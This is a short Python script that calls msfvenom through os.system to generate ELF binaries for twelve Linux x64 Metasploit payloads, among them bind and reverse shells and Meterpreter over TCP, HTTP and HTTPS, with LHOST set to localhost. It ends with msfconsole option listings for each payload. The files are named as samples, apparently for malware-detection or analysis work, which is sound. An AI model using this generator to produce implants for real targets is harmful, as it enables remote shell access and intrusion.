import os

LHOST = "127.0.0.1"
LPORT = 4444
LURI = "/dev"

payloads = ['linux/x64/shell/bind_tcp', 'linux/x64/shell/reverse_tcp', 'linux/x64/shell_bind_tcp', 'linux/x64/shell_bind_tcp_random_port', 'linux/x64/shell_reverse_tcp', 'linux/x64/meterpreter/bind_tcp',
            'linux/x64/meterpreter/reverse_tcp', 'linux/x64/meterpreter_reverse_http', 'linux/x64/meterpreter_reverse_https', 'linux/x64/meterpreter_reverse_tcp', 'linux/x64/pingback_bind_tcp', 'linux/x64/pingback_reverse_tcp']

for payload in payloads:
    if 'http' in payload:
        cmd = "sudo msfvenom -p %s lhost=%s lport=%i luri=%s -f elf > sample-%s.bin" % (
            payload, LHOST, LPORT, LURI, payload.replace("/", "-"))
    else:
        cmd = "sudo msfvenom -p %s lhost=%s lport=%i -f elf > sample-%s.bin" % (
            payload, LHOST, LPORT, payload.replace("/", "-"))
    os.system(cmd)

'''resource (msf.rc)> use linux/x64/shell/bind_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/shell/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port

resource (msf.rc)> use linux/x64/shell/reverse_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/shell/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

resource (msf.rc)> use linux/x64/shell_bind_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/shell_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port

resource (msf.rc)> use linux/x64/shell_bind_tcp_random_port
resource (msf.rc)> show options

Module options (payload/linux/x64/shell_bind_tcp_random_port):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

resource (msf.rc)> use linux/x64/shell_reverse_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

resource (msf.rc)> use linux/x64/meterpreter/bind_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address

resource (msf.rc)> use linux/x64/meterpreter/reverse_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

resource (msf.rc)> use linux/x64/meterpreter_reverse_http
resource (msf.rc)> show options

Module options (payload/linux/x64/meterpreter_reverse_http):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8080             yes       The local listener port
   LURI                    no        The HTTP Path

resource (msf.rc)> use linux/x64/meterpreter_reverse_https
resource (msf.rc)> show options

Module options (payload/linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path

resource (msf.rc)> use linux/x64/meterpreter_reverse_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/meterpreter_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

resource (msf.rc)> use linux/x64/pingback_bind_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/pingback_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address

resource (msf.rc)> use linux/x64/pingback_reverse_tcp
resource (msf.rc)> show options

Module options (payload/linux/x64/pingback_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
'''
